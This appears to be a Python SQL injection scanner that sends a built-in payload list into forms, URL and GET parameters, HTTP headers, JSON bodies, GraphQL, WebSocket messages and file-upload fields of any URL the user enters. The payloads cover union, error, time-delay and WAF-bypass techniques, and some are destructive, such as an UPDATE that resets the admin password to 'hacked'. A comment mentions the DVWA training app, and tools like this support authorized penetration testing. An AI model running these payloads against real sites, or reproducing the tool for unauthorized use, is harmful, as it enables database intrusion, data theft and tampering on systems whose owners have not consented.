import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import time
import websocket
import re

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
# Add PHPSESSID for DVWA if needed: s.cookies.set("PHPSESSID", "your_phpsessid_here")

# Payload Database
SQLI_PAYLOADS = {
    "quote_escape": ["'", "\"", "`", "'--", "\"--", "`--"],
    "parenthesis": [")", "')", "\")", "`)", ")--"],
    "error": [
        "' AND 1=CONVERT(int,@@version)--",  # MSSQL
        "' AND 1=CONVERT(int,USER())--",
        "' AND EXTRACTVALUE(1,CONCAT(0x5c,USER()))--"  # MySQL XML error
    ],
    "union": [
        "' UNION SELECT null,version()--",
        "' UNION SELECT 1,table_name FROM information_schema.tables--",
        "' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1,@@version--",          # MySQL/MSSQL
        "' UNION SELECT 1,version()--",          # PostgreSQL
        "' UNION SELECT 1,banner FROM v$version--" # Oracle
    ],
    "boolean": [
        "' OR 1=1--",
        "' AND 1=1--",
        "' OR 'a'='a",
        "' AND 1=2--",
        "' OR SUBSTRING(@@version,1,1)='5'--",
        "1' OR 1=1"
    ],
    "time_delay": [
        "' OR SLEEP(5)--",
        "' OR BENCHMARK(10000000,SHA1(1))--",
        "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--",  # MySQL
        "' OR 123=(SELECT 123 FROM PG_SLEEP(5))--",  # PostgreSQL
        "' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",  # Oracle
        "' WAITFOR DELAY '0:0:5'--"  # MSSQL
    ],
    "fingerprint": [
        "' AND @@version LIKE '%MySQL%'--",
        "' AND SELECT * FROM v$version--"
    ],
    "waf_bypass": [
        "' Or 1=1--",
        "' UnIoN SeLeCt 1,2--",
        "'/*!50000OR*/1=1--",
        "'/**/OR/**/1=1--",
        "'%00OR 1=1--",
        "'%20OR%201=1--"
    ],
    "second_order": [
        "'--'",
        "'; UPDATE users SET password='hacked' WHERE user='admin'--",
        "'; INSERT INTO logs (event) VALUES ('SQLi attack')--"
    ]
}

def identify_form_type(form):
    inputs = form.find_all(["input", "textarea", "select"])
    input_names = [tag.attrs.get("name", "").lower() for tag in inputs]
    if any(name in ["username", "password", "login", "pass"] for name in input_names):
        return "Login Form"
    elif any(name in ["search", "query", "q"] for name in input_names):
        return "Search Box"
    elif any(name in ["email", "name", "phone", "message"] for name in input_names) and len(inputs) > 2:
        return "Registration/Contact Form"
    elif any(name in ["email", "name", "phone", "message", "feedback", "comment"] for name in input_names) and len(inputs) > 2:
        return "Contact Feedback Form"
    elif any(name in ["email", "reset"] for name in input_names) and len(inputs) <= 2:
        return "Password Reset Form"
    elif any(name in ["admin", "dashboard"] for name in input_names):
        return "Admin Panel Form"
    return "Generic Form"

def get_forms(url):
    try:
        soup = BeautifulSoup(s.get(url).content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException:
        return []

def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get")
    inputs = []
    csrf_names = ["csrf_token", "token", "csrf", "_csrf"]
    session_names = ["session_id", "sessid", "sid"]
    for tag in form.find_all(["input", "textarea", "select"]):
        tag_type = tag.name
        tag_name = tag.attrs.get("name")
        tag_value = tag.attrs.get("value", "") if tag.name == "input" else ""
        input_label = tag_type.capitalize()
        if tag.name == "input" and tag.attrs.get("type", "").lower() == "hidden":
            input_label = "Hidden Input"
            if tag_name and tag_name.lower() in csrf_names:
                input_label = "CSRF Token"
            elif tag_name and tag_name.lower() in session_names:
                input_label = "Session ID"
        if tag_name is not None and tag.attrs.get("type", "").lower() not in ["submit", "button"]:
            inputs.append({
                "type": tag_type,
                "name": tag_name,
                "value": tag_value,
                "label": input_label
            })
    detailsOfForm['action'] = action
    print(f"Form action: {action}")
    detailsOfForm['method'] = method
    detailsOfForm['inputs'] = inputs
    return detailsOfForm

def vulnerable(response, payload_type, payload, baseline_content):
    errors = {
        "quoted string not properly terminated",
        "unclosed quotation mark after the character string",
        "you have an error in your sql syntax",
        "mysql_fetch_array()",
        "syntax error at or near",
        "incorrect syntax near",
        "ORA-01756",
        "unterminated quoted string",
        "unexpected end of SQL command"
    }
    sql_indicators = {
        "union": [r"\d+\.\d+\.\d+-MySQL", r"PostgreSQL \d+\.\d+", r"Oracle Database", r"information_schema", r"table_name", r"column_name"],
        "fingerprint": [r"MySQL", r"PostgreSQL", r"Oracle", r"SQL Server"]
    }
    try:
        content = response.content.decode('utf-8', errors='ignore').lower()
        if any(error in content for error in errors):
            print(f"[DEBUG] SQL error found: {content[:100]}...")
            return True
        if payload_type == "time_delay":
            return False  # Rely solely on time threshold in scan functions
        if payload_type in ["union", "fingerprint"]:
            if any(re.search(indicator, content) for indicator in sql_indicators.get(payload_type, [])):
                print(f"[DEBUG] SQL indicator found in {payload_type}: {content[:100]}...")
                return True
        if len(set(content.split()) - set(baseline_content.split())) > 50:
            print(f"[DEBUG] Significant content change detected: {content[:100]}...")
            return True
        return False
    except (UnicodeDecodeError, requests.RequestException):
        return False

def scan_http_headers(url, summary):
    print(f"\n[+] Scanning HTTP headers on {url}...")
    headers_to_test = {
        "User-Agent": s.headers["User-Agent"],
        "Referer": "",
        "X-Forwarded-For": "1.1.1.1",
        "Cookie": ""
    }
    summary["http_headers"] = summary.get("http_headers", {"tested_headers": 0, "vulnerable_headers": []})
    try:
        baseline = s.get(url, timeout=5).text.lower()
    except requests.RequestException:
        baseline = ""
    for header_name, default_value in headers_to_test.items():
        print(f"\n[*] Testing {header_name} header...")
        for payload_type, payload_list in SQLI_PAYLOADS.items():
            for payload in payload_list:
                test_headers = s.headers.copy()
                test_headers[header_name] = f"{default_value}{payload}" if default_value else payload
                try:
                    start_time = time.time()
                    res = s.get(url, headers=test_headers, timeout=10)
                    elapsed = time.time() - start_time
                    if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(res, payload_type, payload, baseline):
                        print(f"[!] VULNERABLE ({payload_type}) in {header_name} header: {payload} (Response time: {elapsed:.2f}s)")
                        summary["http_headers"]["vulnerable_headers"].append((header_name, payload_type, payload))
                    else:
                        print(f"[✓] Safe for {payload_type} in {header_name} header: {payload} (Response time: {elapsed:.2f}s)")
                except requests.RequestException as e:
                    print(f"[!] Error submitting payload {payload} for {header_name} header: {e}")
        summary["http_headers"]["tested_headers"] += 1

def scan_url_parameters(url, summary):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    print(f"[+] Scanning URL parameters on {url}...")
    if not query_params:
        print("[*] No query parameters found in the URL.")
        return
    param_types = {
        "query_string": ["id", "product_id", "item"],
        "api_endpoint": lambda u: parsed_url.path.startswith('/api/'),
        "pagination": ["page", "offset", "limit"],
        "search": ["search", "q", "query", "keyword"],
        "category": ["category", "cat", "filter", "sort"]
    }
    is_api = param_types["api_endpoint"](url)
    if is_api:
        print("\n[*] Testing API endpoint parameters...")
    try:
        baseline = s.get(url, timeout=5).text.lower()
    except requests.RequestException:
        baseline = ""
    for param in query_params:
        param_type = "generic"
        if param in param_types["query_string"]:
            param_type = "query_string"
        elif param in param_types["pagination"]:
            param_type = "pagination"
        elif param in param_types["search"]:
            param_type = "search"
        elif param in param_types["category"]:
            param_type = "category"
        elif is_api:
            param_type = "api_endpoint"
        print(f"\n[*] Testing {param_type} parameter: {param}...")
        for payload_type, payload_list in SQLI_PAYLOADS.items():
            for payload in payload_list:
                modified_params = query_params.copy()
                modified_params[param] = [payload]
                modified_query = urlencode(modified_params, doseq=True)
                test_url = f"{base_url}?{modified_query}"
                try:
                    start_time = time.time()
                    res = s.get(test_url, timeout=10)
                    elapsed = time.time() - start_time
                    if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(res, payload_type, payload, baseline):
                        print(f"[!] VULNERABLE ({payload_type}) in {param_type} param {param}: {payload} (Response time: {elapsed:.2f}s)")
                        summary["url_params"]["vulnerable_params"].append((param, payload_type, payload))
                    else:
                        print(f"[✓] Safe for {payload_type} in {param}: {payload} (Response time: {elapsed:.2f}s)")
                except requests.RequestException as e:
                    print(f"[!] Error submitting payload {payload} for {param}: {e}")
        summary["url_params"]["tested_params"] += 1

def scan_get_params(url, summary):
    print(f"\n[+] Scanning GET parameters on {url}...")
    summary["get_params"] = summary.get("get_params", {"tested_params": 0, "vulnerable_params": []})
    common_params = ["id", "username", "q", "search", "page"]
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    try:
        baseline = s.get(base_url, timeout=5).text.lower()
    except requests.RequestException:
        baseline = ""
    for param in common_params:
        print(f"\n[*] Testing GET parameter: {param}...")
        for payload_type, payload_list in SQLI_PAYLOADS.items():
            for payload in payload_list:
                try:
                    start_time = time.time()
                    response = s.get(base_url, params={param: payload}, timeout=10)
                    elapsed = time.time() - start_time
                    if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(response, payload_type, payload, baseline):
                        print(f"[!] VULNERABLE ({payload_type}) in GET param {param}: {payload} (Response time: {elapsed:.2f}s)")
                        summary["get_params"]["vulnerable_params"].append((param, payload_type, payload))
                    else:
                        print(f"[✓] Safe for {payload_type} in GET param {param}: {payload} (Response time: {elapsed:.2f}s)")
                except requests.RequestException as e:
                    print(f"[!] Error with GET payload {payload} for {param}: {e}")
        summary["get_params"]["tested_params"] += 1

def scan_json_post(url, summary):
    print(f"\n[+] Scanning POST JSON data on {url}...")
    summary["json_post"] = summary.get("json_post", {"tested_params": 0, "vulnerable_params": []})
    common_params = [
        {"param": "id", "json": {"id": ""}},
        {"param": "username", "json": {"username": ""}},
        {"param": "search", "json": {"search": ""}},
        {"param": "user.name", "json": {"user": {"name": ""}}}
    ]
    try:
        baseline = s.get(url, timeout=5).text.lower()
    except requests.RequestException:
        baseline = ""
    for item in common_params:
        param = item["param"]
        print(f"\n[*] Testing JSON POST parameter: {param}...")
        for payload_type, payload_list in SQLI_PAYLOADS.items():
            for payload in payload_list:
                # Create JSON data with payload
                data = item["json"].copy()
                if "." in param:
                    parent, child = param.split(".")
                    data[parent][child] = payload
                else:
                    data[param] = payload
                try:
                    start_time = time.time()
                    response = s.post(url, json=data, headers={"Content-Type": "application/json"}, timeout=10)
                    elapsed = time.time() - start_time
                    if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(response, payload_type, payload, baseline):
                        print(f"[!] VULNERABLE ({payload_type}) in JSON POST param {param}: {payload} (Response time: {elapsed:.2f}s)")
                        summary["json_post"]["vulnerable_params"].append((param, payload_type, payload))
                    else:
                        print(f"[✓] Safe for {payload_type} in JSON POST param {param}: {payload} (Response time: {elapsed:.2f}s)")
                except requests.RequestException as e:
                    print(f"[!] Error with JSON payload {payload} for {param}: {e}")
        summary["json_post"]["tested_params"] += 1

def scan_graphql(url, summary):
    print(f"\n[+] Scanning GraphQL endpoint on {url}/graphql...")
    summary["graphql"] = summary.get("graphql", {"tested_params": 0, "vulnerable_params": []})
    graphql_endpoint = urljoin(url, "/graphql")
    # Simple GraphQL query with injectable field
    query_template = 'query { user(id: "%s") { name } }'
    try:
        baseline = s.post(graphql_endpoint, json={"query": query_template % "1"}, headers={"Content-Type": "application/json"}, timeout=5).text.lower()
    except requests.RequestException:
        print("[!] No GraphQL endpoint found.")
        return
    print(f"[*] GraphQL endpoint detected. Testing payloads...")
    for payload_type, payload_list in SQLI_PAYLOADS.items():
        for payload in payload_list:
            query = query_template % payload
            try:
                start_time = time.time()
                response = s.post(graphql_endpoint, json={"query": query}, headers={"Content-Type": "application/json"}, timeout=10)
                elapsed = time.time() - start_time
                if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(response, payload_type, payload, baseline):
                    print(f"[!] VULNERABLE ({payload_type}) in GraphQL query: {payload} (Response time: {elapsed:.2f}s)")
                    summary["graphql"]["vulnerable_params"].append(("user.id", payload_type, payload))
                else:
                    print(f"[✓] Safe for {payload_type} in GraphQL query: {payload} (Response time: {elapsed:.2f}s)")
            except requests.RequestException as e:
                print(f"[!] Error with GraphQL payload {payload}: {e}")
        summary["graphql"]["tested_params"] += 1

def scan_websocket(url, summary):
    print(f"\n[+] Checking for WebSocket support on {url}...")
    summary["websocket"] = summary.get("websocket", {"tested_params": 0, "vulnerable_params": []})
    ws_paths = ["/ws", "/socket.io", "/websocket"]
    #payloads = SQLI_PAYLOADS["quote_escape"] + SQLI_PAYLOADS["boolean"] + SQLI_PAYLOADS["time_delay"]
    def on_message(ws, message):
        if any(error in message.lower() for error in {
            "quoted string not properly terminated",
            "unclosed quotation mark after the character string",
            "you have an error in your sql syntax",
            "mysql_fetch_array()",
            "syntax error at or near",
            "incorrect syntax near",
            "ORA-01756",
            "unterminated quoted string",
            "unexpected end of SQL command"
        }):
            print(f"[!] VULNERABLE in WebSocket: {message}")
            summary["websocket"]["vulnerable_params"].append(("websocket", "response", message))
        else:
            print(f"[*] WebSocket response: {message}")
    def on_error(ws, error):
        print(f"[!] WebSocket error: {error}")
    for path in ws_paths:
        ws_url = "ws://" + urlparse(url).netloc + path
        print(f"[*] Trying WebSocket path: {ws_url}")
        try:
            ws = websocket.WebSocket()
            ws.on_message = on_message
            ws.on_error = on_error
            ws.connect(ws_url, timeout=5)
            print(f"[+] WebSocket connection established at {ws_url}. Testing payloads...")
            for payload_type, payload_list in SQLI_PAYLOADS.items():
                for payload in payload_list:
                    # Test both plain and JSON-formatted payloads
                    messages = [payload, f'{{"message": "{payload}"}}']
                    for msg in messages:
                        try:
                            start_time = time.time()
                            ws.send(msg)
                            time.sleep(1)
                            elapsed = time.time() - start_time
                            if payload_type == "time_delay" and elapsed >= 4:
                                print(f"[!] VULNERABLE (time_delay) in WebSocket: {msg} (Response time: {elapsed:.2f}s)")
                                summary["websocket"]["vulnerable_params"].append(("websocket", payload_type, msg))
                            else:
                                print(f"[*] Tested WebSocket payload ({payload_type}): {msg} (Response time: {elapsed:.2f}s)")
                        except websocket.WebSocketException as e:
                            print(f"[!] Error with WebSocket payload {msg}: {e}")
                summary["websocket"]["tested_params"] += 1
            ws.close()
        except websocket.WebSocketException:
            print(f"[!] WebSocket not supported at {ws_url}.")

def scan_file_uploads(url, summary):
    print(f"\n[+] Checking for file upload forms on {url}...")
    # Initialize summary for file uploads
    summary["file_uploads"] = summary.get("file_uploads", {"tested_params": 0, "vulnerable_params": []})
    
    # Get all forms from the webpage
    forms = get_forms(url)
    # Find forms with a file input
    file_forms = [form for form in forms if form.find("input", type="file")]
    
    if not file_forms:
        print("[*] No file upload forms found on this page.")
        return
    
    # Get a baseline response to compare against
    try:
        baseline = s.get(url, timeout=5).text.lower()
    except requests.RequestException:
        baseline = ""

    # Loop through each file upload form
    for form in file_forms:
        details = form_details(form)
        print(f"[*] Found file upload form: Action={details['action']}")

        # Find the file input's name
        file_input = form.find("input", type="file")
        file_name = file_input.attrs.get("name", "file")

        # Create a dummy file to upload (a simple text file)
        dummy_file = {file_name: ("test.txt", b"Test content", "text/plain")}

        # Test each payload type and payload
        for payload_type, payload_list in SQLI_PAYLOADS.items():
            print(f"\n[*] Testing {payload_type} payloads for file upload...")
            for payload in payload_list:
                # Test 1: SQL payload in the filename
                test_file = {file_name: (f"test{payload}.txt", b"Test content", "text/plain")}
                # Include other form fields (like description) with default values
                data = {input_item["name"]: input_item.get("value", "") for input_item in details["inputs"] if input_item["name"]}
                
                try:
                    start_time = time.time()
                    if details["method"].lower() == "post":
                        res = s.post(urljoin(url, details["action"]), files=test_file, data=data, timeout=10)
                    else:
                        print("[!] File uploads need POST method. Skipping GET.")
                        continue
                    elapsed = time.time() - start_time

                    # Check if the response shows a vulnerability
                    if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(res, payload_type, payload, baseline):
                        print(f"[!] VULNERABLE ({payload_type}) in filename: {payload} (Response time: {elapsed:.2f}s)")
                        summary["file_uploads"]["vulnerable_params"].append((file_name, payload_type, payload))
                    else:
                        print(f"[✓] Safe for {payload_type} in filename: {payload} (Response time: {elapsed:.2f}s)")
                except requests.RequestException as e:
                    print(f"[!] Error with filename payload {payload}: {e}")
                
                # Test 2: SQL payload in other form fields (like description)
                for input_item in details["inputs"]:
                    if input_item["name"] and input_item["label"] in ["input", "textarea"]:
                        data[input_item["name"]] = payload
                        # Reset other fields to default values
                        for other_item in details["inputs"]:
                            if other_item["name"] and other_item["name"] != input_item["name"]:
                                data[other_item["name"]] = other_item.get("value", "")
                                
                        try:
                            start_time = time.time()
                            if details["method"].lower() == "post":
                                res = s.post(urljoin(url, details["action"]), files=dummy_file, data=data, timeout=10)
                            else:
                                print("[!] File uploads need POST method. Skipping GET.")
                                continue
                            elapsed = time.time() - start_time

                            if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(res, payload_type, payload, baseline):
                                print(f"[!] VULNERABLE ({payload_type}) in field {input_item['name']}: {payload} (Response time: {elapsed:.2f}s)")
                                summary["file_uploads"]["vulnerable_params"].append((input_item["name"], payload_type, payload))
                            else:
                                print(f"[✓] Safe for {payload_type} in field {input_item['name']}: {payload} (Response time: {elapsed:.2f}s)")
                        except requests.RequestException as e:
                            print(f"[!] Error with field payload {payload} for {input_item['name']}: {e}")
                
                summary["file_uploads"]["tested_params"] += 1

def scan_checkboxes_radio(url, summary):
    print(f"\n[+] Scanning checkboxes and radio buttons on {url}...")
    summary["checkbox_radio"] = summary.get("checkbox_radio", {"tested_params": 0, "vulnerable_params": []})
    forms = get_forms(url)
    try:
        baseline = s.get(url, timeout=5).text.lower()
    except requests.RequestException:
        baseline = ""
    for form in forms:
        details = form_details(form)
        check_radio_inputs = [
            input_item for input_item in details["inputs"]
            if form.find("input", attrs={"type": "checkbox", "name": input_item["name"]})
            or form.find("input", attrs={"type": "radio", "name": input_item["name"]})
        ]
        if not check_radio_inputs:
            print(f"[*] No checkboxes or radio buttons found in form: Action={details['action']}")
            continue
        print(f"[*] Testing checkboxes/radio buttons in form: Action={details['action']}")
        for input_item in check_radio_inputs:
            input_name = input_item["name"]
            print(f"\n[*] Testing checkbox/radio: {input_name}...")
            summary["checkbox_radio"]["tested_params"] += 1
            for payload_type, payload_list in SQLI_PAYLOADS.items():
                for payload in payload_list:
                    data = {i["name"]: i.get("value", "") for i in details["inputs"] if i["name"]}
                    data[input_name] = payload
                    try:
                        start_time = time.time()
                        if details["method"].lower() == "post":
                            res = s.post(urljoin(url, details["action"]), data=data, timeout=10)
                        else:
                            res = s.get(urljoin(url, details["action"]), params=data, timeout=10)
                        elapsed = time.time() - start_time
                        if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(res, payload_type, payload, baseline):
                            print(f"[!] VULNERABLE ({payload_type}) in checkbox/radio {input_name}: {payload} (Response time: {elapsed:.2f}s)")
                            summary["checkbox_radio"]["vulnerable_params"].append((input_name, payload_type, payload))
                        else:
                            print(f"[✓] Safe for {payload_type} in checkbox/radio {input_name}: {payload} (Response time: {elapsed:.2f}s)")
                    except requests.RequestException as e:
                        print(f"[!] Error with checkbox/radio payload {payload} for {input_name}: {e}")

def scan_url_fragments(url, summary):
    # Note: URL fragments (#) are client-side and not sent to the server. This function tests a simulated 'fragment' query parameter.
    print(f"\n[+] Scanning URL fragments on {url} (simulated as query parameters)...")
    summary["url_fragments"] = summary.get("url_fragments", {"tested_params": 0, "vulnerable_params": []})
    try:
        baseline = s.get(url, timeout=5).text.lower()
    except requests.RequestException:
        baseline = ""
    for payload_type, payload_list in SQLI_PAYLOADS.items():
        print(f"\n[*] Testing {payload_type} payloads for URL fragments...")
        for payload in payload_list:
            test_params = {"fragment": payload}
            try:
                start_time = time.time()
                res = s.get(url, params=test_params, timeout=10)
                elapsed = time.time() - start_time
                if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(res, payload_type, payload, baseline):
                    #print(f"[!] VULNERABLE ({payload_type}) in URL fragment (as query param): {payload} (Response time: {elapsed:.2f}s)")
                    print(f"[!] VULNERABLE ({payload_type}) in simulated URL fragment (sent as query param): {payload} (Response time: {elapsed:.2f}s)")
                    summary["url_fragments"]["vulnerable_params"].append(("fragment", payload_type, payload))
                else:
                    print(f"[✓] Safe for {payload_type} in URL fragment (as query param): {payload} (Response time: {elapsed:.2f}s)")
            except requests.RequestException as e:
                print(f"[!] Error with URL fragment payload {payload}: {e}")
        summary["url_fragments"]["tested_params"] += 1

def crawl_for_urls(url):
    crawled_urls = set()
    try:
        soup = BeautifulSoup(s.get(url).content, "html.parser")
        for link in soup.find_all("a", href=True):
            href = urljoin(url, link["href"])
            parsed_href = urlparse(href)
            if parsed_href.netloc == urlparse(url).netloc and parsed_href.query and href != url:
                crawled_urls.add(href)
    except requests.RequestException:
        pass
    return list(crawled_urls)

def sql_injection_scan(url):
    summary = {
        "forms": {"tested_inputs": 0, "vulnerable_inputs": []},
        "url_params": {"tested_params": 0, "vulnerable_params": []},
        "hidden_inputs": {"detected": 0, "preserved": 0},
        "http_headers": {"tested_headers": 0, "vulnerable_headers": []},
        "get_params": {"tested_params": 0, "vulnerable_params": []},
        "json_post": {"tested_params": 0, "vulnerable_params": []},
        "graphql": {"tested_params": 0, "vulnerable_params": []},
        "websocket": {"tested_params": 0, "vulnerable_params": []},
        "file_uploads": {"tested_params": 0, "vulnerable_params": []},
        "checkbox_radio": {"tested_params": 0, "vulnerable_params": []},
        "url_fragments": {"tested_params": 0, "vulnerable_params": []}
    }
    
    scan_http_headers(url, summary)
    scan_url_parameters(url, summary)
    scan_get_params(url, summary)
    scan_json_post(url, summary)
    scan_graphql(url, summary)
    scan_websocket(url, summary)
    scan_file_uploads(url, summary)
    scan_checkboxes_radio(url, summary)
    scan_url_fragments(url, summary)
    crawled_urls = crawl_for_urls(url)
    for crawled_url in crawled_urls:
        print(f"\n[+] Scanning crawled URL: {crawled_url}")
        scan_url_parameters(crawled_url, summary)
        scan_graphql(crawled_url, summary)
    forms = get_forms(url)
    print(f"\n[+] Detected {len(forms)} forms on {url}.")
    for i, form in enumerate(forms):
        details = form_details(form)
        print(f"Form {i}: Action={details['action']}, Inputs={details['inputs']}")
    
    try:
        baseline = s.get(url, timeout=5).text.lower()
    except requests.RequestException:
        baseline = ""
    for form in forms:
        form_type = identify_form_type(form)
        print(f"\n[*] Scanning {form_type}...")
        details = form_details(form)
        for input_item in details["inputs"]:
            if input_item["label"] in ["Hidden Input", "CSRF Token", "Session ID"]:
                summary["hidden_inputs"]["detected"] += 1
        for input_tag in details["inputs"]:
            if input_tag["type"] in ["input", "textarea", "select"] and input_tag["name"]:
                input_label = input_tag["label"]
                print(f"\n[*] Testing {input_label}: {input_tag['name']}...")
                summary["forms"]["tested_inputs"] += 1
                for payload_type, payload_list in SQLI_PAYLOADS.items():
                    print(f"\n[*] Testing {payload_type} payloads...")
                    for payload in payload_list:
                        data = {}
                        hidden_preserved = False
                        for input_item in details["inputs"]:
                            if input_item["name"]:
                                if input_item["name"] == input_tag["name"]:
                                    data[input_item["name"]] = payload
                                else:
                                    data[input_item["name"]] = input_item.get("value", "")
                                    if input_item["label"] in ["Hidden Input", "CSRF Token", "Session ID"]:
                                        hidden_preserved = True
                        print(f"Debug: Submitting data: {data}")
                        if hidden_preserved:
                            summary["hidden_inputs"]["preserved"] += 1
                        try:
                            start_time = time.time()
                            if details["method"].lower() == "post":
                                res = s.post(urljoin(url, details["action"]), data=data, timeout=10)
                            else:
                                res = s.get(urljoin(url, details["action"]), params=data, timeout=10)
                            elapsed = time.time() - start_time
                            if (payload_type == "time_delay" and elapsed >= 4) or vulnerable(res, payload_type, payload, baseline):
                                print(f"[!] VULNERABLE ({payload_type}) in {input_label} ({input_tag['name']}): {payload} (Response time: {elapsed:.2f}s)")
                                summary["forms"]["vulnerable_inputs"].append((input_tag["name"], payload_type, payload))
                            else:
                                print(f"[✓] Safe for {payload_type} in {input_label} ({input_tag['name']}): {payload} (Response time: {elapsed:.2f}s)")
                        except requests.RequestException as e:
                            print(f"[!] Error submitting payload {payload} for {input_tag['name']}: {e}")
    
    print("\n=== Scan Summary ===")
    print(f"Forms: {summary['forms']['tested_inputs']} inputs tested, {len(summary['forms']['vulnerable_inputs'])} vulnerable")
    for vuln in summary['forms']['vulnerable_inputs']:
        print(f"  - Vulnerable input: {vuln[0]} ({vuln[1]}: {vuln[2]})")
    print(f"URL Parameters: {summary['url_params']['tested_params']} parameters tested, {len(summary['url_params']['vulnerable_params'])} vulnerable")
    for vuln in summary['url_params']['vulnerable_params']:
        print(f"  - Vulnerable parameter: {vuln[0]} ({vuln[1]}: {vuln[2]})")
    print(f"Hidden Inputs: {summary['hidden_inputs']['detected']} detected, {summary['hidden_inputs']['preserved']} preserved in submissions")
    print(f"HTTP Headers: {summary['http_headers']['tested_headers']} headers tested, {len(summary['http_headers']['vulnerable_headers'])} vulnerable")
    for vuln in summary['http_headers']['vulnerable_headers']:
        print(f"  - Vulnerable header: {vuln[0]} ({vuln[1]}: {vuln[2]})")
    print(f"GET Parameters: {summary['get_params']['tested_params']} parameters tested, {len(summary['get_params']['vulnerable_params'])} vulnerable")
    for vuln in summary['get_params']['vulnerable_params']:
        print(f"  - Vulnerable parameter: {vuln[0]} ({vuln[1]}: {vuln[2]})")
    print(f"JSON POST: {summary['json_post']['tested_params']} parameters tested, {len(summary['json_post']['vulnerable_params'])} vulnerable")
    for vuln in summary['json_post']['vulnerable_params']:
        print(f"  - Vulnerable parameter: {vuln[0]} ({vuln[1]}: {vuln[2]})")
    print(f"WebSocket: {summary['websocket']['tested_params']} parameters tested, {len(summary['websocket']['vulnerable_params'])} vulnerable")
    for vuln in summary['websocket']['vulnerable_params']:
        print(f"  - Vulnerable WebSocket: {vuln[0]} ({vuln[1]}: {vuln[2]})")
    print(f"GraphQL: {summary['graphql']['tested_params']} parameters tested, {len(summary['graphql']['vulnerable_params'])} vulnerable")
    for vuln in summary['graphql']['vulnerable_params']:
        print(f"  - Vulnerable GraphQL param: {vuln[0]} ({vuln[1]}: {vuln[2]})")
    print(f"File Uploads: {summary['file_uploads']['tested_params']} params tested, {len(summary['file_uploads']['vulnerable_params'])} vulnerable")
    for vuln in summary['file_uploads']['vulnerable_params']:
        print(f"  - Vulnerable file upload param: {vuln[0]} ({vuln[1]}: {vuln[2]})")
    print(f"Checkboxes/Radio Buttons: {summary['checkbox_radio']['tested_params']} params tested, {len(summary['checkbox_radio']['vulnerable_params'])} vulnerable")
    for vuln in summary['checkbox_radio']['vulnerable_params']:
        print(f"  - Vulnerable checkbox/radio param: {vuln[0]} ({vuln[1]}: {vuln[2]})")
    print(f"URL Fragments: {summary['url_fragments']['tested_params']} params tested, {len(summary['url_fragments']['vulnerable_params'])} vulnerable")
    for vuln in summary['url_fragments']['vulnerable_params']:
        print(f"  - Vulnerable URL fragment: {vuln[0]} ({vuln[1]}: {vuln[2]})")

if __name__ == "__main__":
    urlToBeChecked = input("Enter target URL (e.g., http://example.com): ").strip()
    time.sleep(1)
    sql_injection_scan(urlToBeChecked)